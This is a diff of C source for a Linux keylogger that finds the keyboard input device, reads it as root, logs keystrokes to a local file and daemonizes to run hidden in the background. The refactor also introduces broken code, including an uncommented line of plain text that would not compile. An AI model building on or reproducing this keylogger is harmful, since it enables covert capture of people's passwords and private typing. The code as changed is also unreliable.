@@ -1,11 +1,11 @@
 #include <stdio.h>
-#include <fcntl.h>   //used for: open
+#include <fcntl.h>   //open
 #include <stdlib.h>
-#include <string.h>  //used for: strerror
+#include <string.h>  //strerror
 #include <errno.h>
 #include <stdint.h>
 #include <assert.h>
-#include <unistd.h>  //used for: daemon, close
+#include <unistd.h>  //daemon, close
 #include <linux/input.h>
 
 #include "key_util.h"
@@ -16,20 +16,16 @@
 #define KEY_PRESS 1
 
 typedef struct input_event input_event;
-static void root_check();
-static char *get_keyboard_device_file_name();
-static int open_keyboard_device_file(char *device_file);
 
-/*Exit with return code -1 if user does not have root privileges*/
-static void root_check() {
-   if (geteuid() != 0) {
-      printf("Must run as root! Exiting... \n");
-      exit(-1);
-   }
-}
+int main(int argc, char **argv) {
+    Check for root privileges
+    if (geteuid() != 0) {
+        printf("Must run as root! Exiting... \n");
+        exit(-1);
+    }
 
-/*Detects and returns the name of the keyboard device file. (Asssumes the keyboard device file always has an EV of 120013)*/
-static char *get_keyboard_device_file_name() {
+   Config config;
+    /*Retrieve keyboard device file*/
     static const char *command =
     "grep -E 'Handlers|EV' /proc/bus/input/devices |"
     "grep -B1 120013 |"
@@ -38,40 +34,25 @@ static char *get_keyboard_device_file_name() {
     
     FILE *pipe = popen(command, "r");
     if (pipe == NULL) {
-        printf("Could not determine keyboard device file");
+        printf("Could not determine keyboard device file \nExiting...");
+        exit(-1);
     }
-    
     char result[20] = "/dev/input/";
     char temp[9];
     fgets(temp, 9, pipe);
-    
     pclose(pipe);
-    return strdup(strcat(result, temp));
-}
-
-/*Opens the keyboard device file given, returns the file descriptor on success, otherwise print error and exit*/
-static int open_keyboard_device_file(char *device_file) {
-   int kb_fd = open(device_file, O_RDONLY);
-   if (kb_fd == -1) {
-      printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
-      exit(-1);
-   }
-   return kb_fd;
-}
-
-
-int main(int argc, char **argv) {
-   root_check();
-   Config config;
-   
-    /*Retrieve and open keyboard device file*/
-    config.device_file = get_keyboard_device_file_name();
-   int kb_fd = open_keyboard_device_file(config.device_file);
+    config.device_file = strcat(result, temp);
+    
+    /*Open keyboard device file*/
+    int kb_fd = open(config.device_file, O_RDONLY);
+    if (kb_fd == -1) {
+        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
+        exit(-1);
+    }
    assert(kb_fd > 0);
     
     /*Open log file*/
-   config.log_file = "/log/keylogger.log";
-   FILE *log_file = fopen(config.log_file, "a");
+   FILE *log_file = fopen("log/keylogger.log", "a");
    if (log_file == NULL) {
       printf("Could not open log file. \nExiting...");
       exit(-1);
@@ -80,9 +61,9 @@ int main(int argc, char **argv) {
    /*Disable buffering to write on every KEY_PRESS*/
    setbuf(log_file, NULL);
 
-    /*TODO - remove this? */
    /*Daemonize process by redirecting stdin and stdout to /dev/null*/
-   if (daemon(1, 0) == -1) {
+  // assert(daemon(1, 0) == -1);
+    if (daemon(1, 0) == -1) {
       printf("Could not daemonize. \nError: %s. \nExiting...", strerror(errno));
       exit(-1);
    }
